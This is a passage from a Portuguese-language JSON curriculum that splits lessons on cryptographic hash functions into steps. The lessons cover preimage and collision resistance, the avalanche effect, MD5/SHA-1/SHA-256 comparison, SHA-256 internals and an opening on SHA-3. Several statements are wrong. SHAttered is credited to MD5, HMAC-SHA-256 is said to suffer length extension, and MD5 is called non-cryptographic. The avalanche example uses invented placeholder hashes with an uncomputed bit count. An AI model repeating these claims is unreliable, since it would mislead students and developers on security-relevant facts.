                                "Explicação clara da unidirecionalidade e implicações.",
                                "Uso correto de terminologia (determinística, fixed-size, one-way).",
                                "Conexão com contexto de cibersegurança."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Estudo de funções modulares e propriedades de mapeamento.",
                                "Programação: Implementação de bibliotecas como hashlib em Python ou Java.",
                                "Ciências da Computação: Algoritmos e complexidade computacional (one-way functions).",
                                "Ética e Direito: Implicações legais em privacidade de dados e hashing de senhas.",
                                "Física/Química: Analogia com espectros ou assinaturas moleculares únicas."
                              ],
                              "realWorldApplication": "Em cibersegurança, funções hash armazenam senhas de forma segura (ex: bcrypt em bancos de dados), verificam integridade de downloads (checksums SHA-256), garantem imutabilidade em blockchain (Merkle trees) e detectam alterações em logs de auditoria."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.3.1.2",
                            "name": "Explicar resistências criptográficas",
                            "description": "Descrever resistência à pré-imagem (dificuldade em encontrar input para hash dado), segunda pré-imagem (diferente input para mesmo hash) e colisões (dois inputs com mesmo hash).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Introdução aos Conceitos de Resistências Criptográficas",
                                  "subSteps": [
                                    "Defina função hash como uma função unidirecional que mapeia dados de tamanho variável para um hash fixo.",
                                    "Explique o que significa 'resistência' no contexto criptográfico: propriedade que torna ataques computacionalmente inviáveis.",
                                    "Liste as três resistências principais: pré-imagem, segunda pré-imagem e colisões.",
                                    "Discuta a importância dessas propriedades para a segurança de sistemas criptográficos.",
                                    "Compare com funções não criptográficas que falham nessas resistências."
                                  ],
                                  "verification": "Escreva um resumo de 100 palavras definindo funções hash e listando as três resistências com uma frase cada.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Notebook com internet",
                                    "Documentação oficial de SHA-256 (RFC 6234)",
                                    "Vídeo introdutório sobre hashes (Khan Academy ou similar)"
                                  ],
                                  "tips": "Use analogias como 'máquina de moer carne' para função hash: fácil moer, impossível reconstruir.",
                                  "learningObjective": "Compreender o papel das resistências como pilares da segurança em funções hash.",
                                  "commonMistakes": [
                                    "Confundir hash com criptografia simétrica",
                                    "Achar que hashes são reversíveis",
                                    "Ignorar o aspecto probabilístico das resistências"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explicar Resistência à Pré-Imagem",
                                  "subSteps": [
                                    "Defina resistência à pré-imagem: dada uma saída h, é difícil encontrar qualquer entrada m tal que hash(m) = h.",
                                    "Discuta a dificuldade computacional: requer ~2^n operações para n bits de saída.",
                                    "Ilustre com exemplo: hash de 'senha123' é difícil de inverter sem brute force.",
                                    "Compare com ataques: brute force vs. ataques mais sofisticados como rainbow tables.",
                                    "Calcule tempo estimado para quebrar SHA-256 (bilhões de anos com hardware atual)."
                                  ],
                                  "verification": "Calcule o número de tentativas necessárias para uma pré-imagem em SHA-256 (256 bits) e explique por quê é inviável.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Calculadora ou Python para potências de 2",
                                    "Ferramenta online como hash calculator (ex: md5hashing.net)",
                                    "Artigo sobre ataques à pré-imagem"
                                  ],
                                  "tips": "Pense em termos de chaves de 256 bits: 2^256 é maior que átomos no universo observável.",
                                  "learningObjective": "Dominar a definição e implicações da resistência à pré-imagem.",
                                  "commonMistakes": [
                                    "Confundir com colisão",
                                    "Subestimar o tamanho exponencial",
                                    "Achar que salting resolve pré-imagem (não diretamente)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explicar Resistência à Segunda Pré-Imagem",
                                  "subSteps": [
                                    "Defina segunda pré-imagem: dado m1 com hash(h1), encontrar m2 ≠ m1 tal que hash(m2) = h1.",
                                    "Explique por que é similar à pré-imagem, mas mais forte: atacante conhece uma entrada válida.",
                                    "Discuta cenários de ataque: modificar documento sem alterar hash.",
                                    "Compare complexidade: ainda ~2^n operações.",
                                    "Exemplo prático: tentar encontrar segunda pré-imagem para um hash conhecido."
                                  ],
                                  "verification": "Descreva um ataque de segunda pré-imagem em um contrato digital e por quê funções seguras previnem isso.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Python com biblioteca hashlib",
                                    "Exemplos de hashes vulneráveis como MD5",
                                    "Paper acadêmico sobre ataques de segunda pré-imagem"
                                  ],
                                  "tips": "Segunda pré-imagem é 'encontrar irmão gêmeo' para um input conhecido.",
                                  "learningObjective": "Diferenciar e explicar resistência à segunda pré-imagem.",
                                  "commonMistakes": [
                                    "Confundir com colisão (que não requer hash fixo)",
                                    "Achar menos importante que pré-imagem",
                                    "Ignorar aplicações em assinaturas digitais"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explicar Resistência a Colisões e Síntese",
                                  "subSteps": [
                                    "Defina colisão: encontrar m1 ≠ m2 tal que hash(m1) = hash(m2), sem conhecer hash prévio.",
                                    "Explique birthday paradox: complexidade ~2^(n/2) para n bits.",
                                    "Discuta ataques conhecidos: SHAttered para MD5, tentativas em SHA-1.",
                                    "Sintetize as três resistências e sua hierarquia de força.",
                                    "Avalie impacto em protocolos reais como blockchain e certificados digitais."
                                  ],
                                  "verification": "Explique birthday attack com exemplo numérico para 128 bits e liste funções hash quebradas por colisões.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Simulador de birthday paradox online",
                                    "Relatório SHAttered (Google)",
                                    "Biblioteca Python para hashes múltiplos"
                                  ],
                                  "tips": "Colisões são o 'calcanhar de Aquiles' mais acessível; monitore notícias de quebras.",
                                  "learningObjective": "Integrar conhecimentos sobre colisões e importância coletiva das resistências.",
                                  "commonMistakes": [
                                    "Confundir complexidade de colisão com pré-imagem",
                                    "Subestimar birthday paradox",
                                    "Achar SHA-256 imune para sempre"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando Python (hashlib), gere hash SHA-256 de 'documento_original.txt'. Tente encontrar uma pré-imagem, segunda pré-imagem ou colisão alterando o arquivo minimamente. Meça tempo para pequenas entradas e extrapole para 256 bits, demonstrando inviabilidade prática.",
                              "finalVerifications": [
                                "Defina corretamente as três resistências sem confusões.",
                                "Calcule complexidades aproximadas (2^n para pré-imagem, 2^{n/2} para colisões).",
                                "Cite um exemplo real de função hash quebrada por falha em resistências.",
                                "Explique por quê essas propriedades são cruciais para senhas e blockchain.",
                                "Diferencie ataques em um diagrama simples.",
                                "Discuta mitigações como usar hashes mais longos ou HMAC."
                              ],
                              "assessmentCriteria": [
                                "Precisão nas definições (sem erros conceituais).",
                                "Uso correto de terminologia criptográfica.",
                                "Compreensão de complexidades computacionais e paradoxo birthday.",
                                "Capacidade de exemplos práticos e reais.",
                                "Síntese integrada das três resistências.",
                                "Clareza na explicação oral ou escrita."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Probabilidade (birthday paradox), complexidade assintótica (Big O).",
                                "Programação: Implementação de hashes em Python/Java, brute force simulations.",
                                "Física/Química: Analogias com entropia e reações irreversíveis.",
                                "História: Evolução de MD5/SHA-1 para SHA-3 após quebras de colisões."
                              ],
                              "realWorldApplication": "Em sistemas de senhas (bcrypt usa hash resistente), blockchain (Merkle trees dependem de colisão-resistência para integridade), certificados digitais (evitar falsificações via colisões) e detecção de integridade de arquivos (Git usa SHA-1, migrando por vulnerabilidades)."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.3.1.1"
                            ]
                          },
                          {
                            "id": "10.1.2.3.1.3",
                            "name": "Identificar o efeito avalanche",
                            "description": "Demonstrar como uma pequena mudança no input causa grande alteração no hash, ilustrando com exemplos numéricos ou ferramentas como hashcat.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a definição e importância do efeito avalanche",
                                  "subSteps": [
                                    "Leia a definição: o efeito avalanche ocorre quando uma mínima alteração no input (ex: 1 bit) resulta em pelo menos 50% dos bits do hash output alterados.",
                                    "Estude exemplos teóricos: em SHA-256 (256 bits), mudança de 1 bit no input deve flipar ~128 bits no output.",
                                    "Pesquise a relevância em criptografia: previne ataques de busca diferencial e garante preimage resistance.",
                                    "Anote por que isso diferencia hashes criptográficos de não-criptográficos (ex: CRC32 não tem avalanche forte).",
                                    "Compare com funções fracas como adler32 usando diagramas online."
                                  ],
                                  "verification": "Escreva um resumo de 100 palavras explicando o conceito e sua importância, sem erros conceituais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Artigos online sobre propriedades de hash (Wikipedia: Avalanche effect), notas pessoais.",
                                  "tips": "Use analogias como 'efeito borboleta' para visualizar propagação de mudanças.",
                                  "learningObjective": "Definir precisamente o efeito avalanche e explicar seu papel na segurança de hashes.",
                                  "commonMistakes": "Confundir com colisão (mesmo input/output diferente) ou assumir 100% de mudança em todos os bits."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar ferramentas para gerar hashes",
                                  "subSteps": [
                                    "Instale Python e biblioteca hashlib (pip install cryptography se necessário).",
                                    "Ou use ferramenta online: md5hashgenerator.com ou sha256.online.",
                                    "Teste hash básico: hash('hello') com SHA-256 e anote o output hexadecimal.",
                                    "Aprenda a converter hex para binário para contar bits flipados (use bin(int(hex,16))[2:].zfill(256)).",
                                    "Prepare inputs de teste: 'hello' e 'hellp' (mudança de 1 caractere)."
                                  ],
                                  "verification": "Gere e exiba corretamente o hash SHA-256 de pelo menos 3 strings diferentes.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Python 3+, editor de código (VS Code), calculadora online de hash.",
                                  "tips": "Prefira Python para automação; online para rapidez inicial.",
                                  "learningObjective": "Dominar geração de hashes SHA-256 para inputs variados.",
                                  "commonMistakes": "Usar hash não-criptográfico como MD5 sem notar diferenças sutis; esquecer de padronizar comprimento do hash."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Demonstrar o efeito com comparações numéricas",
                                  "subSteps": [
                                    "Gere hash de input base: 'avalanche_test' → anote hash1.",
                                    "Altere 1 bit: mude para 'Avalanche_test' (case sensitive) → hash2.",
                                    "Calcule distância de Hamming: conte bits diferentes entre hash1 e hash2 (esperado ~50%).",
                                    "Repita com mudança mínima: flip 1 bit manualmente em hex input.",
                                    "Use script Python para automatizar: def hamming_distance(h1, h2): ... e execute para 5 pares."
                                  ],
                                  "verification": "Produza tabela com 3 pares input/hash e % de bits alterados (todos >45%).",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Script Python pronto: import hashlib; def sha256_hash(s): return hashlib.sha256(s.encode()).hexdigest()",
                                  "tips": "XOR os hashes binários para Hamming: bin(int(h1,16) ^ int(h2,16)).count('1').",
                                  "learningObjective": "Quantificar o efeito avalanche medindo mudanças em bits.",
                                  "commonMistakes": "Ignorar encoding (UTF-8 vs ASCII); calcular % errado (deve ser sobre total de bits do hash)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar com ferramenta avançada e sintetizar",
                                  "subSteps": [
                                    "Instale hashcat (ou use online demo) e gere hashes em batch: hashcat -m 0 input.txt.",
                                    "Compare avalanche em diferentes algoritmos: MD5 vs SHA-256.",
                                    "Crie gráfico: bits flipados vs posição da mudança no input.",
                                    "Discuta exceções: alguns hashes podem variar ligeiramente por design.",
                                    "Resuma em relatório: inclua código, resultados e conclusões."
                                  ],
                                  "verification": "Relatório com pelo menos 3 demonstrações mostrando >50% mudança média.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Hashcat (hashcat.net), ou Python script expandido.",
                                  "tips": "Hashcat é ótimo para batch; foque em modo --stdout para pure hashing.",
                                  "learningObjective": "Aplicar ferramentas profissionais para validar propriedades de hash.",
                                  "commonMistakes": "Usar hashcat para cracking em vez de hashing puro; não normalizar comprimento de input."
                                }
                              ],
                              "practicalExample": "Input: 'password123' → SHA-256: 3f5a5b0e... Mudança para 'Password123' (1ª letra maiúscula) → SHA-256: a1b2c3d4... Distância de Hamming: 132/256 bits (~52%), demonstrando avalanche.",
                              "finalVerifications": [
                                "Calcular corretamente Hamming distance >50% para 5 pares de inputs com 1-bit diff.",
                                "Explicar verbalmente por que avalanche fortalece hashes contra ataques diferenciais.",
                                "Gerar hashes com Python/hashcat sem erros para inputs variados.",
                                "Identificar quando um hash NÃO exibe avalanche (ex: soma simples).",
                                "Produzir tabela comparativa de bits flipados em SHA-256 vs MD5.",
                                "Discutir impacto em cenários reais como blockchain."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: definição correta do efeito avalanche (100%).",
                                "Demonstração prática: pelo menos 3 exemplos numéricos com cálculos exatos.",
                                "Análise quantitativa: % de bits alterados calculado corretamente (>45% médio).",
                                "Uso de ferramentas: evidência de Python ou hashcat em outputs.",
                                "Relatório claro: estrutura lógica com tabelas/gráficos.",
                                "Compreensão profunda: ligação com segurança criptográfica."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Distância de Hamming e teoria da informação.",
                                "Programação: Scripts Python para automação de hashes.",
                                "Física: Analogia com propagação de ondas/efeito borboleta.",
                                "Estatística: Probabilidade de ~50% flips aleatórios."
                              ],
                              "realWorldApplication": "Em blockchain (ex: Bitcoin), garante que pequenas mudanças em transações invalidem hashes de blocos inteiros, prevenindo fraudes; usado em detecção de integridade de arquivos (Git) e senhas salgadas contra rainbow tables."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.3.1.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.3.2",
                        "name": "Algoritmos Comuns de Funções Hash",
                        "description": "Principais algoritmos de hash como MD5, SHA-1, SHA-2 (incluindo SHA-256) e SHA-3, suas estruturas, tamanhos de saída e status de segurança atual.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.3.2.1",
                            "name": "Comparar MD5 e SHA-1 com SHA-256",
                            "description": "Listar tamanhos de hash (128 bits para MD5, 160 para SHA-1, 256 para SHA-256), vulnerabilidades conhecidas (colisões em MD5/SHA-1) e recomendações de uso.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar tamanhos de saída e origens dos algoritmos",
                                  "subSteps": [
                                    "Pesquise o tamanho de saída do MD5 em bits e bytes usando fontes oficiais como RFC 1321",
                                    "Pesquise o tamanho de saída do SHA-1 conforme RFC 3174",
                                    "Pesquise o tamanho de saída do SHA-256 conforme RFC 6234 ou FIPS 180-4",
                                    "Anote as datas de publicação e designers (MD5 por Rivest 1991, SHA-1 por NSA 1995, SHA-256 por NSA 2001)",
                                    "Crie uma tabela comparativa simples dos tamanhos"
                                  ],
                                  "verification": "Tabela completa com tamanhos corretos: MD5 (128 bits/16 bytes), SHA-1 (160 bits/20 bytes), SHA-256 (256 bits/32 bytes)",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Documentos RFC (1321, 3174, 6234)",
                                    "Planilha ou bloco de notas"
                                  ],
                                  "tips": [
                                    "Priorize fontes NIST ou IETF para precisão; converta bits para bytes dividindo por 8"
                                  ],
                                  "learningObjective": "Memorizar e comparar precisamente os comprimentos de saída dos hashes",
                                  "commonMistakes": [
                                    "Confundir bits com bytes (ex: dizer MD5 16 bits)",
                                    "Ignorar origens históricas",
                                    "Usar Wikipedia sem verificar RFCs"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar vulnerabilidades de colisão em MD5 e SHA-1",
                                  "subSteps": [
                                    "Defina o conceito de colisão em funções hash (dois inputs diferentes com mesmo output)",
                                    "Estude ataques conhecidos no MD5 (ex: colisão prática por Wang em 2004)",
                                    "Pesquise colisões no SHA-1 (ex: SHAttered attack de 2017 com PDFs colidentes)",
                                    "Compare complexidade computacional: MD5 colisões em 2^18 tempo, SHA-1 em 2^63",
                                    "Discuta impactos: falsificação de certificados, assinaturas digitais"
                                  ],
                                  "verification": "Resumo escrito explicando colisões com exemplos reais e por que são fatais para integridade",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Internet para artigos (SHAttered.sh, Google security blog)",
                                    "Vídeos explicativos sobre colisões",
                                    "Notebook para anotações"
                                  ],
                                  "tips": [
                                    "Visualize colisões com diagramas; foque em ataques práticos, não teóricos"
                                  ],
                                  "learningObjective": "Compreender por que MD5 e SHA-1 são inseguros devido a colisões práticas",
                                  "commonMistakes": [
                                    "Confundir colisão com preimage attack",
                                    "Subestimar impacto real (ex: ignorar uso em Git histórico)",
                                    "Pensar que SHA-1 ainda é seguro"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estudar características e segurança do SHA-256",
                                  "subSteps": [
                                    "Revise a família SHA-2 e posição do SHA-256 (parte de FIPS 180-4)",
                                    "Analise resistência a colisões: complexidade estimada 2^128",
                                    "Compare com MD5/SHA-1 em termos de iterações internas e operações (AND, XOR, rotações)",
                                    "Verifique adoção: padrão NIST para novos sistemas desde 2011",
                                    "Teste computacional: gere hashes com ferramenta online para observar uniformidade"
                                  ],
                                  "verification": "Descrição das vantagens do SHA-256 sobre os anteriores, com evidências de resistência",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta online como CyberChef ou hash-online",
                                    "NIST FIPS 180-4 PDF",
                                    "Calculadora para potências de 2"
                                  ],
                                  "tips": [
                                    "Gere hashes de strings aleatórias para ver propriedades avalanche",
                                    "Note que SHA-256 é mais lento, mas seguro"
                                  ],
                                  "learningObjective": "Reconhecer SHA-256 como sucessor seguro e suas propriedades criptográficas",
                                  "commonMistakes": [
                                    "Confundir SHA-256 com SHA-3 (Keccak)",
                                    "Ignorar trade-offs de performance",
                                    "Achar que SHA-256 é invulnerável a ataques quânticos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar algoritmos e formular recomendações de uso",
                                  "subSteps": [
                                    "Crie uma matriz comparativa: tamanho, vulnerabilidades, velocidade, uso recomendado",
                                    "Recomende: Evitar MD5/SHA-1 para novos projetos; migrar para SHA-256 ou superior",
                                    "Discuta exceções: MD5 para checksums não-seguros, SHA-1 em legados como TLS 1.0",
                                    "Planeje migração: ferramentas como openssl para atualizar hashes",
                                    "Resuma em um relatório de 1 página"
                                  ],
                                  "verification": "Matriz e recomendações claras: 'Não use MD5/SHA-1 para segurança; prefira SHA-256'",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Ferramenta OpenSSL ou Python hashlib",
                                    "Modelo de tabela (Excel/Google Sheets)",
                                    "Checklist de melhores práticas NIST"
                                  ],
                                  "tips": [
                                    "Considere contexto: integridade vs. confidencialidade",
                                    "Verifique políticas atuais (ex: browsers baniram SHA-1)"
                                  ],
                                  "learningObjective": "Aplicar comparação para decisões práticas em cibersegurança",
                                  "commonMistakes": [
                                    "Recomendar MD5 para qualquer uso moderno",
                                    "Ignorar performance em dispositivos embarcados",
                                    "Não mencionar alternativas como BLAKE2"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando Python: importe hashlib; gere MD5, SHA-1 e SHA-256 de 'hello' e 'hellp'; observe diferenças mínimas causam outputs totalmente diferentes (efeito avalanche). Simule colisão conceitual alterando inputs para matching hash em MD5 fraco via ferramenta online.",
                              "finalVerifications": [
                                "Lista tamanhos corretos sem erros",
                                "Explica colisões com exemplos reais (Wang, SHAttered)",
                                "Justifica preferência por SHA-256 com fatos",
                                "Fornece recomendações NIST-alinhadas",
                                "Compara velocidades e usos práticos",
                                "Identifica cenários onde MD5/SHA-1 ainda aparecem (legado)"
                              ],
                              "assessmentCriteria": [
                                "Precisão factual em tamanhos e vulnerabilidades (100%)",
                                "Profundidade na explicação de colisões e impactos",
                                "Clareza na matriz comparativa e recomendações",
                                "Evidências de pesquisa (citações RFC/NIST)",
                                "Capacidade de aplicar a cenários reais",
                                "Ausência de mitos comuns (ex: 'MD5 ainda OK')"
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Probabilidades, complexidade 2^n, aritmética modular",
                                "Programação: Implementar hashing em Python/JavaScript",
                                "História da Computação: Evolução de padrões cripto NIST/NSA",
                                "Ética e Direito: Responsabilidade em usar crypto obsoleta",
                                "Física/Engenharia: Impacto quântico futuro (Grover/Shor)"
                              ],
                              "realWorldApplication": "Verificação de integridade em downloads de software (ex: Linux ISOs usam SHA-256), proteção de senhas em bancos de dados, proof-of-work em Bitcoin, certificados SSL/TLS para evitar MITM attacks."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.3.1.2"
                            ]
                          },
                          {
                            "id": "10.1.2.3.2.2",
                            "name": "Descrever o funcionamento do SHA-256",
                            "description": "Explicar o processo de padding, blocos de 512 bits, constantes e rotações lógicas no algoritmo SHA-256, com diagrama conceitual.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Processo de Padding da Mensagem",
                                  "subSteps": [
                                    "Analise o comprimento da mensagem em bits.",
                                    "Adicione o bit '1' ao final da mensagem.",
                                    "Preencha com bits '0' até que o comprimento total mod 512 seja igual a 448.",
                                    "Anexe o comprimento original da mensagem como um inteiro de 64 bits no big-endian.",
                                    "Verifique que o bloco final tem exatamente 512 bits."
                                  ],
                                  "verification": "Confirme que uma mensagem de exemplo, como 'abc' (24 bits), resulta em padding correto com comprimento 448 + 64 = 512 bits.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Papel e caneta",
                                    "Calculadora binária",
                                    "Especificação RFC 6234 do SHA-256"
                                  ],
                                  "tips": [
                                    "Use representação hexadecimal para facilitar cálculos.",
                                    "Lembre-se: padding garante que qualquer mensagem seja múltiplo de 512 bits."
                                  ],
                                  "learningObjective": "Explicar como o padding prepara a mensagem para processamento em blocos fixos.",
                                  "commonMistakes": [
                                    "Esquecer o bit '1' inicial.",
                                    "Usar little-endian para o comprimento.",
                                    "Não alinhar corretamente para 448 bits mod 512."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Dividir a Mensagem em Blocos de 512 Bits",
                                  "subSteps": [
                                    "Converta a mensagem paddada em uma sequência de bytes.",
                                    "Divida em blocos de 64 bytes (512 bits) cada.",
                                    "Numere os blocos sequencialmente (bloco 0, 1, ...).",
                                    "Para cada bloco, interprete como 16 palavras de 32 bits (W[0] a W[15]).",
                                    "Prepare para expansão da mensagem nos próximos passos."
                                  ],
                                  "verification": "Para 'abc', confirme 1 bloco de 512 bits com valores hexadecimais corretos iniciais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor de texto hexadecimal",
                                    "Ferramenta online de conversão binário-hex",
                                    "Papel para diagramas"
                                  ],
                                  "tips": [
                                    "Visualize blocos como matrizes 16x32 bits.",
                                    "Teste com mensagens vazia e longa para entender múltiplos blocos."
                                  ],
                                  "learningObjective": "Dominar a segmentação da mensagem em unidades processáveis pelo algoritmo.",
                                  "commonMistakes": [
                                    "Ignorar ordem big-endian nas palavras de 32 bits.",
                                    "Confundir bytes com bits nos blocos."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Inicializar Constantes e Valores Hash Iniciais",
                                  "subSteps": [
                                    "Liste as 8 constantes hash iniciais (H0 a H7) baseadas em raízes quadradas de primos (valores hex fixos).",
                                    "Liste as 64 constantes de rodada (K0 a K63) baseadas em raízes cúbicas de primos.",
                                    "Inicialize variáveis de trabalho a = H0, b = H1, ..., h = H7.",
                                    "Memorize ou anote funções lógicas: Ch, Maj, Sigma0, Sigma1, sigma0, sigma1 (rotações e XORs).",
                                    "Desenhe tabela de constantes para referência rápida."
                                  ],
                                  "verification": "Recite H0 = 0x6a09e667 e K0 = 0x428a2f98 corretamente.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Tabela de constantes SHA-256 impressa",
                                    "Calculadora para rotações bitwise"
                                  ],
                                  "tips": [
                                    "Rotações: Σ0(x) = ROTR^2(x) XOR ROTR^13(x) XOR ROTR^22(x).",
                                    "Use Python para validar valores iniciais."
                                  ],
                                  "learningObjective": "Entender o papel das constantes na difusão e avalanche effect.",
                                  "commonMistakes": [
                                    "Confundir Sigma maiúsculo (compressão) com sigma minúsculo (expansão).",
                                    "Usar valores errados de constantes."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Processar Cada Bloco: Expansão e Função de Compressão",
                                  "subSteps": [
                                    "Expanda W[16] a W[63]: W[t] = σ1(W[t-2]) + W[t-7] + σ0(W[t-15]) + W[t-16] (mod 2^32).",
                                    "Para 64 rodadas: Calcule T1 = h + Σ1(e) + Ch(e,f,g) + K[t] + W[t]; T2 = Σ0(a) + Maj(a,b,c).",
                                    "Atualize variáveis: h=g, g=f, f=e, e=d+T1, d=c, c=b, b=a, a=T1+T2.",
                                    "Após 64 rodadas, adicione a H0..H7: H0 += a, etc.",
                                    "Repita para todos os blocos, concatenando H0..H7 como 256 bits finais."
                                  ],
                                  "verification": "Simule 1 rodada manualmente e verifique soma modular.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Planilha Excel para simulações",
                                    "Implementação Python parcial",
                                    "Diagrama de fluxo SHA-256"
                                  ],
                                  "tips": [
                                    "Todas operações + são mod 2^32.",
                                    "Desenhe ciclo de atualização como shift register."
                                  ],
                                  "learningObjective": "Executar o core do algoritmo, focando em rotações lógicas.",
                                  "commonMistakes": [
                                    "Esquecer adições modulares.",
                                    "Ordem errada nas atualizações de variáveis."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Produzir o Hash Final e Criar Diagrama Conceitual",
                                  "subSteps": [
                                    "Concatene H0 a H7 em 32 bytes hexadecimais.",
                                    "Valide com ferramenta como shasum -a 256 'abc'.",
                                    "Desenhe fluxograma: mensagem -> padding -> blocos -> init -> process -> digest.",
                                    "Inclua símbolos para rotações (ROTR, SHR) e funções lógicas.",
                                    "Explique avalanche: 1 bit muda -> 50% output muda."
                                  ],
                                  "verification": "Seu diagrama cobre padding a digest; hash de 'abc' matches ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta de desenho como Draw.io",
                                    "Comando shasum no terminal"
                                  ],
                                  "tips": [
                                    "Use setas para fluxo de dados.",
                                    "Compare com SHA-1 para diferenças."
                                  ],
                                  "learningObjective": "Visualizar e comunicar o algoritmo inteiro.",
                                  "commonMistakes": [
                                    "Diagrama omite padding ou length.",
                                    "Hash final em ordem errada."
                                  ]
                                }
                              ],
                              "practicalExample": "Para mensagem 'abc': Padding resulta em bloco [0x61626380... seguido de zeros e length 0x18]. Após processamento, digest = ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad. Simule primeiras rodadas manualmente.",
                              "finalVerifications": [
                                "Explicar padding para mensagem de 1000 bits.",
                                "Listar Σ0 e σ0 corretamente.",
                                "Calcular W[16] para bloco exemplo.",
                                "Desenhar ciclo de compressão.",
                                "Validar hash de string teste com ferramenta.",
                                "Identificar 3 funções lógicas chave."
                              ],
                              "assessmentCriteria": [
                                "Precisão no padding e length encoding (20%).",
                                "Correta expansão de mensagem e constantes (25%).",
                                "Domínio de rotações e funções bitwise (25%).",
                                "Diagrama claro e completo (15%).",
                                "Exemplo prático validado (10%).",
                                "Explicação oral fluida (5%)."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Operações bitwise, aritmética modular 2^32.",
                                "Programação: Implementar em Python/C para simulação.",
                                "Física/Engenharia: Analogia com circuitos lógicos digitais.",
                                "História da Computação: Evolução de MD5 -> SHA-1 -> SHA-256.",
                                "Estatística: Efeito avalanche e propriedades pseudo-aleatórias."
                              ],
                              "realWorldApplication": "Verificação de integridade em downloads (Git commits), hashing de senhas em bancos de dados, Merkle trees em Bitcoin blockchain, assinaturas digitais em certificados TLS/SSL."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.3.1.1"
                            ]
                          },
                          {
                            "id": "10.1.2.3.2.3",
                            "name": "Introduzir SHA-3 e Keccak",
                            "description": "Diferenciar SHA-3 (baseado em Keccak) de SHA-2 por usar função de esponja, destacando maior resistência a ataques de comprimento.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Fundamentos de SHA-2 e Suas Limitações",
                                  "subSteps": [
                                    "Recapitular o funcionamento de SHA-2: modo Merkle-Damgård com compressão em rounds de 64.",
                                    "Identificar ataques conhecidos, como length extension attacks, onde um atacante pode estender a mensagem sem conhecer a chave secreta.",
                                    "Analisar exemplos de vulnerabilidades em HMAC-SHA-256 devido a length extension.",
                                    "Comparar com SHA-1 para contextualizar evolução.",
                                    "Documentar limitações em um diagrama simples."
                                  ],
                                  "verification": "Criar um diagrama ou tabela resumindo SHA-2 e listando pelo menos 3 limitações, incluindo length extension.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação NIST FIPS 180-4 (SHA-2)",
                                    "Ferramenta de diagrama como Draw.io",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use analogias como 'caixa preta' para Merkle-Damgård para facilitar compreensão.",
                                  "learningObjective": "Entender as bases e fraquezas de SHA-2 para contrastar com SHA-3.",
                                  "commonMistakes": [
                                    "Confundir SHA-2 com SHA-1",
                                    "Ignorar que length extension afeta modos como HMAC",
                                    "Não visualizar o processo de padding"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Introduzir o Conceito de Função de Esponja (Keccak)",
                                  "subSteps": [
                                    "Explicar a função de esponja: absorção (soak) e espremedura (squeeze) de dados em um estado fixo.",
                                    "Descrever componentes: permutação Keccak-f (1600 bits), taxa (r) e capacidade (c).",
